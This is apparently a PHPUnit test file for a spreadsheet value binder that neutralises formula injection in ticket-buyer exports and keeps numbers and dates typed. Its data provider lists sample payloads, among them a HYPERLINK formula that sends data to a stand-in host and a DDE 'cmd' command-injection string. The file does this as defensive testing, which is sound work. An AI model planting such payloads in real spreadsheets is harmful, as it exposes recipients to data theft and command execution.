<?php

namespace Tests\Unit\Exports\ValueBinders;

use HiEvents\Exports\ValueBinders\FormulaSafeValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * The escaper decides what looks like a formula; this asserts the decision actually reaches the
 * spreadsheet. A value the buyer typed must land in the cell as text, and the numbers and dates
 * the organiser reads in the same report must keep their types — escaping that breaks the sales
 * figures would be a worse bug than the one being fixed.
 */
class FormulaSafeValueBinderTest extends TestCase
{
    private Spreadsheet $spreadsheet;

    protected function setUp(): void
    {
        parent::setUp();

        Cell::setValueBinder(new FormulaSafeValueBinder());
        $this->spreadsheet = new Spreadsheet();
    }

    protected function tearDown(): void
    {
        $this->spreadsheet->disconnectWorksheets();

        parent::tearDown();
    }

    private function cellFor(mixed $value): Cell
    {
        return $this->spreadsheet->getActiveSheet()->setCellValue('A1', $value)->getCell('A1');
    }

    public static function attackerControlledValueProvider(): array
    {
        return [
            'equals' => ['=1+1'],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.test?d="&A1,"Ver mi entrada")'],
            'cmd injection' => ['=cmd|\' /C calc\'!A0'],
            'plus' => ['+1+1'],
            'at' => ['@SUM(A1:A9)'],
            'tab' => ["\t=1+1"],
            'carriage return' => ["\r=1+1"],
        ];
    }

    #[DataProvider('attackerControlledValueProvider')]
    public function testAFormulaLookingValueIsStoredAsTextNotAsAFormula(string $value): void
    {
        $cell = $this->cellFor($value);

        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
        $this->assertFalse(
            $cell->isFormula(),
            'A buyer-supplied value must never be evaluated when the organiser opens the export.',
        );

        // PhpSpreadsheet normalises a carriage return to a line feed on the way in; the payload
        // itself must still arrive intact, as inert text.
        $this->assertSame(str_replace("\r", "\n", $value), $cell->getValue());
    }

    public function testNumbersKeepTheirNumericType(): void
    {
        foreach ([42, 42.5, 0, -50.0] as $number) {
            $cell = $this->cellFor($number);

            $this->assertSame(DataType::TYPE_NUMERIC, $cell->getDataType(), 'Falló con: ' . $number);
            $this->assertSame($number, $cell->getValue());
        }
    }

    public function testNegativeAmountsWrittenAsStringsStayNumeric(): void
    {
        // A refund column reaches the sheet as "-50.00"; escaping it would turn the report into text.
        $cell = $this->cellFor('-50.00');

        $this->assertSame(DataType::TYPE_NUMERIC, $cell->getDataType());
    }

    public function testOrdinaryTextIsLeftAlone(): void
    {
        foreach (['Ada Lovelace', 'ada@example.com', 'Platea A1'] as $text) {
            $cell = $this->cellFor($text);

            $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
            $this->assertSame($text, $cell->getValue());
        }
    }

    public function testDatesAreStillBoundAsDates(): void
    {
        $cell = $this->cellFor('2026-09-08');

        $this->assertSame('2026-09-08', $cell->getValue());
        $this->assertFalse($cell->isFormula());
    }

    public function testAnEmptyValueIsUnaffected(): void
    {
        $this->assertSame(DataType::TYPE_NULL, $this->cellFor(null)->getDataType());

        // An empty string is bound as an empty string, not as null. It has no first character to
        // trigger on, so the escaper leaves it to the parent binder.
        $emptyString = $this->cellFor('');
        $this->assertSame(DataType::TYPE_STRING, $emptyString->getDataType());
        $this->assertSame('', $emptyString->getValue());
    }
}
